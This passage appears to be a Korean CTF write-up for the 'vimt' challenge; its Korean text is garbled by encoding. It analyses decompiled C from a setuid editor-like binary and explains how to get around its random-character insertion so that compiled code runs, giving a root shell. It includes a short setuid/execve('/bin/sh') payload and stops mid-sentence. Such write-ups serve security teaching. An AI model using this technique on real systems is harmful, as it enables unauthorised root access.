&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">              <span class="keyword">while</span> ( !v3 )</span><br><span class="line">              &#123;</span><br><span class="line">                draw();</span><br><span class="line">                c = getch();</span><br><span class="line">                <span class="keyword">switch</span> ( c )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0x1B</span>:                    <span class="comment">// Esc</span></span><br><span class="line">                                                <span class="comment">// switch to command mode</span></span><br><span class="line">                    v3 = <span class="number">1</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\n:&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0x7F</span>:                    <span class="comment">// Backspace</span></span><br><span class="line">                    <span class="keyword">if</span> ( deleteKey() == <span class="number">-1</span> )</span><br><span class="line">                      v3 = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( cur_y &lt; y )</span><br><span class="line">                    &#123;</span><br><span class="line">                      ++cur_y;</span><br><span class="line">                      cur_x = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">if</span> ( inputKey(c) == <span class="number">-1</span> )</span><br><span class="line">                      v3 = <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// ...</span></span><br><span class="line">              _c = getch();</span><br><span class="line">              <span class="keyword">if</span> ( _c == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v4 &lt; <span class="number">255</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v0 = v4++;</span><br><span class="line">                cmd[v0] = _c;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, _c);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(<span class="string">&quot;set&quot;</span>, cmd, <span class="number">3uLL</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(<span class="string">&quot;compile&quot;</span>, cmd, <span class="number">7uLL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( compile() != <span class="number">-1</span> )</span><br><span class="line">          <span class="built_in">memset</span>(cmd, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">        v3 = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( setAxis(cmd) != <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">    v3 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>init</code> í•¨ìˆ˜ëŠ” 6í–‰ì—ì„œ ioctl ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ê³ , ê²°ê³¼ë¥¼ ì „ì—­ ë³€ìˆ˜ <code>x</code> ì™€ <code>y</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤. <code>/usr/include/asm-generic/ioctls.h</code> íŒŒì¼ì„ ì°¸ê³ í•˜ë©´ ìš”ì²­ ë²ˆí˜¸ <code>0x5413</code> ì€ <code>TIOCGWINSZ</code> ë¡œ, í˜„ì¬ í„°ë¯¸ë„ì˜ ê°€ë¡œì™€ ì„¸ë¡œ í¬ê¸°ë¥¼ êµ¬í•˜ëŠ” ìš”ì²­ì…ë‹ˆë‹¤. 10í–‰ì—ì„œ í„°ë¯¸ë„ì˜ í¬ê¸°ë¥¼ ë°”íƒ•ìœ¼ë¡œ ë¬¸ìë¥¼ ì…ë ¥ë°›ì„ 2ì°¨ì› ë°°ì—´ <code>map</code> ì„ í• ë‹¹í•©ë‹ˆë‹¤. 16í–‰ì—ì„œëŠ” ê°ì¢… ê°’ìœ¼ë¡œ ìƒì„±í•œ ë‚œìˆ˜ë¥¼ ì´ìš©í•´ <code>rand</code> í•¨ìˆ˜ì˜ seedë¥¼ ì´ˆê¸°í™”í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  ioctl(<span class="number">1</span>, <span class="number">0x5413</span>uLL, &amp;sz);                     <span class="comment">// ioctl(1, TIOCGWINSZ, &amp;sz)</span></span><br><span class="line">  x = sz.ws_col;</span><br><span class="line">  y = sz.ws_row - <span class="number">2</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="built_in">map</span> = (<span class="type">char</span> **)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">8LL</span> * (y + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; y; ++i )</span><br><span class="line">    <span class="built_in">map</span>[i] = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, x + <span class="number">1</span>);</span><br><span class="line">  v3 = clock();</span><br><span class="line">  v2 = time(<span class="number">0LL</span>);</span><br><span class="line">  v0 = getpid();</span><br><span class="line">  seed = mix(v3, v2, v0);</span><br><span class="line">  srand(seed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>inputKey</code> í•¨ìˆ˜ëŠ” ì¼ë°˜ì ì¸ ë¬¸ì ì…ë ¥ì„ ì²˜ë¦¬í•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. <code>cur_x</code> , <code>cur_y</code> ëŠ” í˜„ì¬ ì»¤ì„œê°€ ìœ„ì¹˜í•œ ì¢Œí‘œë¥¼ ë‚˜íƒ€ë‚´ëŠ” ì „ì—­ ë³€ìˆ˜ë¡œ, 10í–‰ì€ ì»¤ì„œê°€ í„°ë¯¸ë„ì˜ ê°€ë¡œ ê¸¸ì´ ëê¹Œì§€ ê°„ ê²½ìš° ì¤„ë°”ê¿ˆí•˜ëŠ” ì½”ë“œì…ë‹ˆë‹¤. 19í–‰ì—ì„œ ì…ë ¥ë°›ì€ ë¬¸ìë¥¼ 2ì°¨ì› ë°°ì—´ <code>map</code> ìƒì—ì„œ ì»¤ì„œì˜ ìœ„ì¹˜ì— ëŒ€ì…í•©ë‹ˆë‹¤. 20í–‰ì˜ ë°˜ë³µë¬¸ì„ ë³´ë©´ ë¬¸ì ë’¤ë¡œ ëœë¤í•œ 5ê°œì˜ ë¬¸ìë¥¼ ì¶”ê°€í•˜ê³  ìˆëŠ”ë°, ì´ ë¶€ë¶„ì˜ ì½”ë“œê°€ ì›í•˜ëŠ” ë¬¸ìì—´ì„ ê·¸ëŒ€ë¡œ ì…ë ¥í•  ìˆ˜ ì—†ì—ˆë˜ ì›ì¸ì…ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">inputKey</span><span class="params">(<span class="type">char</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *row; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> xpos; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> random_byte; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> *_row; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> _xpos; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( cur_x &gt;= x )</span><br><span class="line">  &#123;</span><br><span class="line">    cur_x = <span class="number">0</span>;</span><br><span class="line">    ++cur_y;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cur_y &gt;= y )</span><br><span class="line">    cur_y = y - <span class="number">1</span>;</span><br><span class="line">  row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">  xpos = cur_x++;</span><br><span class="line">  row[xpos] = c;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cur_x &gt;= x )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_x = <span class="number">0</span>;</span><br><span class="line">      ++cur_y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( cur_y &gt;= y )</span><br><span class="line">      cur_y = y - <span class="number">1</span>;</span><br><span class="line">    random_byte = ascii[rand() % <span class="number">86</span>];</span><br><span class="line">    _row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">    _xpos = cur_x++;</span><br><span class="line">    _row[_xpos] = random_byte;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>deleteKey</code> í•¨ìˆ˜ëŠ” Backspace ì…ë ¥ì„ ì²˜ë¦¬í•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. Backspaceë¥¼ í•œ ë²ˆ ì…ë ¥í•  ë•Œë§ˆë‹¤ ë°˜ë³µë¬¸ì„ í†µí•´ í˜„ì¬ ì»¤ì„œ ìœ„ì¹˜ì—ì„œ 6ê°œì˜ ë¬¸ìë¥¼ ì§€ì›ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">deleteKey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *row; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cur_x &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_x = <span class="number">0</span>;</span><br><span class="line">      --cur_y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( cur_y &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      cur_y = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    row = <span class="built_in">map</span>[cur_y];</span><br><span class="line">    row[--cur_x] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>setAxis</code> í•¨ìˆ˜ëŠ” Esc ì…ë ¥ í›„ â€œset y &lt;N&gt;â€ ì»¤ë§¨ë“œë¥¼ ì²˜ë¦¬í•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. 21í–‰ì—ì„œ <code>cur_y</code> ì „ì—­ ë³€ìˆ˜ì— ì»¤ë§¨ë“œ ë§¤ê°œë³€ìˆ˜ë¡œ ì „ë‹¬ëœ ì •ìˆ˜ Nì„ ëŒ€ì…í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ Esc ì…ë ¥ í›„ &quot;set y 0&quot;ì„ ì…ë ¥í•˜ë©´, ì»¤ì„œì˜ ì„¸ë¡œì¶• ìœ„ì¹˜ê°€ ì²« ë²ˆì§¸ ì¤„ë¡œ ì´ë™í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">setAxis</span><span class="params">(<span class="type">char</span> *cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> _len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(cmd) &lt;= <span class="number">6</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(cmd);</span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, len - <span class="number">6</span> + <span class="number">1</span>);</span><br><span class="line">  v6 = cmd[<span class="number">4</span>];</span><br><span class="line">  _len = <span class="built_in">strlen</span>(cmd);</span><br><span class="line">  <span class="built_in">memcpy</span>(s, cmd + <span class="number">6</span>, _len - <span class="number">6</span>);</span><br><span class="line">  n = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="string">&#x27;y&#x27;</span> &amp;&amp; v6 != <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  <span class="keyword">if</span> ( n &gt;= <span class="number">0</span> &amp;&amp; n &lt;= y - <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cur_y = n;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>compile</code> í•¨ìˆ˜ëŠ” Esc ì…ë ¥ í›„ â€œcompileâ€ ì»¤ë§¨ë“œë¥¼ ì²˜ë¦¬í•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. 17~25í–‰ì—ì„œ <code>map</code> ì˜ ë‚´ìš©ì„ <code>tmp/</code> ê²½ë¡œì— <code>.c</code> í™•ì¥ìë¥¼ ê°€ì§„ íŒŒì¼ë¡œ ì €ì¥í•©ë‹ˆë‹¤. 30í–‰ì—ì„œ <code>system</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ <code>gcc</code> ë¥¼ ì‹¤í–‰í•´ ì €ì¥í•œ íŒŒì¼ì„ ë°”ì´ë„ˆë¦¬ë¡œ ì»´íŒŒì¼í•˜ê³ , 32í–‰ì—ì„œ ì„±ê³µí•˜ë©´ ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬ë¥¼ ë‹¤ì‹œ <code>system</code> í•¨ìˆ˜ë¡œ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">compile</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  _map = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, (y + <span class="number">1</span>) * (x + <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; y; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; x; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      _map[idx] = <span class="built_in">map</span>[i][j];</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  hexstring = randomHexString(<span class="number">32</span>);</span><br><span class="line">  hexstring_len = <span class="built_in">strlen</span>(hexstring);</span><br><span class="line">  c_file = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, hexstring_len + <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(c_file, <span class="string">&quot;tmp/%s.c&quot;</span>, hexstring);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(hexstring);</span><br><span class="line">  exec_file = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, v1 + <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(exec_file, <span class="string">&quot;tmp/%s&quot;</span>, hexstring);</span><br><span class="line">  fd = open(c_file, <span class="number">0x42</span>, <span class="number">420LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(_map);</span><br><span class="line">  write(fd, _map, v2);</span><br><span class="line">  close(fd);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(c_file);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(exec_file);</span><br><span class="line">  cmd = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, v3 + v5 + <span class="number">9</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;gcc -o %s %s&quot;</span>, exec_file, c_file);</span><br><span class="line">  system(cmd);</span><br><span class="line">  <span class="keyword">if</span> ( !access(exec_file, <span class="number">0</span>) )</span><br><span class="line">    system(exec_file);</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">ë¬¸ì œ í’€ì´</h2><p>ë¬¸ì œ ë°”ì´ë„ˆë¦¬ì— setuid ê¶Œí•œì´ ìˆìœ¼ë¯€ë¡œ, ì…¸ì„ ì‹¤í–‰í•˜ëŠ” C ì†ŒìŠ¤ ì½”ë“œë¥¼ ì…ë ¥í•œ í›„ â€œcompileâ€ ì»¤ë§¨ë“œë¡œ ì»´íŒŒì¼í•˜ì—¬ ì‹¤í–‰í•˜ë©´ root ê¶Œí•œì˜ ì…¸ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ë§Œ  ë¬¸ìë¥¼ ì…ë ¥í•  ë•Œë§ˆë‹¤ ëœë¤í•œ ë¬¸ì 5ê°œê°€ í•¨ê»˜ ì…ë ¥ëœë‹¤ëŠ” ë¬¸ì œê°€ ìˆëŠ”ë°, í„°ë¯¸ë„ì˜ í¬ê¸°ë¥¼ ì˜ ì¡°ì •í•˜ê³  â€œset y &lt;N&gt;â€ ì»¤ë§¨ë“œë¥¼ ì ì ˆíˆ ì‚¬ìš©í•˜ë©´ ì›í•˜ëŠ” ë¬¸ìì—´ë§Œ ì…ë ¥ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì˜ˆë¥¼ ë“¤ì–´ í„°ë¯¸ë„ì˜ ê°€ë¡œ í¬ê¸°ê°€ 47ì¼ ë•Œ, â€œmain()â€ ë¬¸ìì—´ì„ ì…ë ¥í•´ ë³´ê² ìŠµë‹ˆë‹¤. ë¨¼ì € ì²« ë²ˆì§¸ ë¬¸ìì¸ â€˜mâ€™ ì„ ì…ë ¥í•œ í›„ <code>map</code> ë°°ì—´ì˜ ìƒíƒœë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. ì´ˆë¡ìƒ‰ ë¬¸ìëŠ” ì…ë ¥í•œ ë¬¸ì, í°ìƒ‰ ë¬¸ìëŠ” ëœë¤ìœ¼ë¡œ ì…ë ¥ëœ ë¬¸ì, ë‘êº¼ìš´ ìˆ˜ì§ ë°”ëŠ” ì…ë ¥ í›„ ì»¤ì„œì˜ ìœ„ì¹˜ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì…ë ¥í•œ â€˜mâ€™ ì€ ë°°ì—´ì˜ <code>map[0][0]</code> ì— ì €ì¥ë©ë‹ˆë‹¤.</p><p><img src="/images/codegate22-vimt/2.png" alt="2.png"></p><p>â€˜mâ€™ ì„ í•œë²ˆ ë” ì…ë ¥í•´ ë³´ê² ìŠµë‹ˆë‹¤. ì´ì „ì˜ ì…ë ¥ì—ì„œ ì¶”ê°€ëœ ëœë¤í•œ 5ë°”ì´íŠ¸ì˜ ë¬¸ìì—´ë¡œ ì¸í•´, ì´ë²ˆ â€˜mâ€™ ì€ ë°°ì—´ì˜ <code>map[0][6]</code> ì— ì €ì¥ë©ë‹ˆë‹¤.</p><p><img src="/images/codegate22-vimt/3.png" alt="3.png"></p><p>ì´ì™€ ê°™ì´ â€˜mâ€™ ì„ ëª¨ë‘ 8ë²ˆ ì…ë ¥í•´ ë³´ê² ìŠµë‹ˆë‹¤. 8ë²ˆì§¸ë¡œ ì…ë ¥í•œ â€˜mâ€™ ì€ <code>map[0][42]</code> ì— ì €ì¥ë©ë‹ˆë‹¤. ì´í›„ ëœë¤í•œ ë¬¸ìì—´ì´ ì¶”ê°€ë˜ëŠ”ë°, ì¤„ë°”ê¿ˆì´ ì¼ì–´ë‚˜ ìµœì¢…ì ìœ¼ë¡œ ì…ë ¥ í›„ ì»¤ì„œì˜ ìœ„ì¹˜ê°€ <code>map[1][1]</code> ì´ ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/codegate22-vimt/4.png" alt="4.png"></p><p>ì´ ìƒíƒœì—ì„œ â€œset y 0â€ ì»¤ë§¨ë“œë¥¼ ì‹¤í–‰í•˜ë©´, <code>cur_y</code> ì „ì—­ ë³€ìˆ˜ì˜ ê°’ë§Œ 0ìœ¼ë¡œ ë°”ë€Œë©´ì„œ ì»¤ì„œì˜ ìœ„ì¹˜ê°€ <code>map[0][1]</code> ë¡œ ì´ë™í•©ë‹ˆë‹¤.</p><p><img src="/images/codegate22-vimt/5.png" alt="5.png"></p><p>ë”°ë¼ì„œ ì…ë ¥í•  ë¬¸ìì—´ì˜ ë‘ ë²ˆì§¸ ë¬¸ìì¸ â€˜aâ€™ ë¥¼ ì…ë ¥í•˜ë©´, ì˜ë„í–ˆë˜ ëŒ€ë¡œ â€˜maâ€™ ë¥¼ ì…ë ¥í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤. ì¦‰, ê° ë¬¸ìë¥¼ ì…ë ¥í•  ë•Œë§ˆë‹¤ 8ë²ˆì”© ì…ë ¥í•œ í›„ â€œset y 0â€ ì„ ì‹¤í–‰í•˜ë©´ ëª¨ë“  ë¬¸ìë¥¼ ì˜ë„í•œ ìœ„ì¹˜ì— ì…ë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/codegate22-vimt/6.png" alt="6.png"></p><p>ì´ ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ ì½”ë“œë¥¼ ì‘ì„±í•˜ê¸° ìœ„í•´ì„œëŠ” ì „ì²´ ì½”ë“œì— ì¤„ë°”ê¿ˆì´ ì—†ì–´ì•¼ í•˜ê³ , ì½”ë“œì˜ ê¸¸ì´ê°€ í„°ë¯¸ë„ì˜ ê°€ë¡œ í¬ê¸°ì¸ 47ë°”ì´íŠ¸ë³´ë‹¤ ì§§ì•„ì•¼ í•©ë‹ˆë‹¤. ì½”ë“œì˜ ê¸¸ì´ë¥¼ ì¤„ì´ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ <code>gcc</code> ì˜ íŠ¸ë¦­ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>í•¨ìˆ˜ ë¦¬í„´ íƒ€ì…ì„ ëª…ì‹œí•˜ì§€ ì•Šìœ¼ë©´ ê¸°ë³¸ê°’ìœ¼ë¡œ <code>int</code> ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</li><li>ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ì˜ í—¤ë”ë¥¼ <code>#include</code> í•˜ì§€ ì•Šì•„ë„, ë§í‚¹ ê³¼ì •ì—ì„œ ë™ì¼í•œ í”„ë¡œí† íƒ€ì…ì˜ í•¨ìˆ˜ë¥¼ resolveí•˜ì—¬ í˜¸ì¶œí•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.</li></ol><p><div class="link-preview-widget"><a href="https://stackoverflow.com/questions/71759099/where-does-gcc-find-printf-my-code-worked-without-any-include" rel="noopener" target="_blank"><div class="link-preview-widget-title">Where does GCC find printf ? My code worked without any #include</div><div class="link-preview-widget-description">I am a C beginner so I tried to hack around the stuff.I read stdio.h and I found this line:extern int printf (const char *__restrict __format, ...);So I wrote this code and i have no idea why it...</div><div class="link-preview-widget-url">Stack Overflow</div></a><a class="link-preview-widget-image" href="https://stackoverflow.com/questions/71759099/where-does-gcc-find-printf-my-code-worked-without-any-include" rel="noopener" style="background-image: url('https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded');" target="_blank"></a></div></p><p>ë‹¤ìŒì€ ìœ„ì˜ íŠ¸ë¦­ì„ ì‚¬ìš©í•˜ì—¬ ì‘ì„±í•œ ì…¸ì„ ì‹¤í–‰í•˜ëŠ” 41ë°”ì´íŠ¸ì˜ C ì½”ë“œì…ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main() &#123;setuid(<span class="number">0</span>);execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure><p>ì´ ì½”ë“œë¥¼ ì•ì„œ ì‚¬ìš©í•œ 8ë²ˆ ì…ë ¥ í›„ â€œset y 0â€ ì»¤ë§¨ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” 